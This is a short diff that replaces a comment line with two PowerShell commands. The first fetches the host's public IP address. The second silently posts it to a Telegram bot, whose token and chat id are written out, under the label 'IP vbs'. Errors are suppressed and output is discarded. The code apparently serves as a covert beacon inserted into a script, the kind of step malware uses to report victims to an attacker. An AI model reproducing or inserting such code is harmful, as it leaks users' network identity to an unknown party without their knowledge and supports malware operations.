@@ -1,1 +1,2 @@
-#
+$ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -ErrorAction SilentlyContinue).Content
+Invoke-WebRequest -Uri "https://api.telegram.org/bot7299851101:AAG1N7LhBKWSAaSVJ5AqUSR2SaDiCzdJCk8/sendMessage?chat_id=7316246301&text=IP vbs: $ip" -Method Post -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
